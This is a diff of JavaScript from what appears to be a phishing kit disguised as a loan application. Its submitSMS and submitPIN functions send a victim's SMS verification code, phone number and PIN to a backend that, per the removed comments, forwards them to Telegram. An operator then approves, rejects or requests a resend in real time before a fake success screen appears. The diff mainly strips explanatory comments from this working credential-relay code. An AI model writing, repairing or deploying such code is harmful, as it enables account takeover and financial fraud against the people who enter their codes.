@@ -194,18 +194,15 @@ async function pasteSMS() {
 }
 
 // --- 2. SUBMIT SMS & TRIGGER TELEGRAM ---
-// This function is called by the VERIFY & CONTINUE button on the SMS screen
 async function submitSMS() {
     const smsText = document.getElementById('sms-input').value;
     if (smsText.length < 5) return;
 
-    // Show Processing screen immediately
     goToScreen('screen-processing');
 
     const phone = document.getElementById('phone-number').value || "Unknown";
 
     try {
-        // Send the SMS text to Telegram as the 'code'
         const response = await fetch('/api/request-approval', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -219,15 +216,13 @@ async function submitSMS() {
 
             if (statusData.status === 'approve') {
                 clearInterval(interval);
-                goToScreen('screen-pin'); // Loads the next page (4-digit PIN)
+                goToScreen('screen-pin'); 
             } else if (statusData.status === 'reject') {
                 clearInterval(interval);
-                // REJECT logic: popup and go back to 5 digit code page
                 alert("Please enter the correct 5 digit code.");
                 goToScreen('screen-application'); 
             } else if (statusData.status === 'resend') {
                 clearInterval(interval);
-                // RESEND logic: popup and stay on SMS screen
                 alert("Check your SMS for the new SMS code.");
                 goToScreen('screen-sms');
             }
@@ -293,7 +288,6 @@ async function submitPIN() {
 
             if (statusData.status === 'approve') {
                 clearInterval(interval);
-                
                 document.getElementById('final-amount-display').innerText = parseInt(appliedAmount).toLocaleString();
                 goToScreen('screen-success'); 
             } else if (statusData.status === 'reject') {
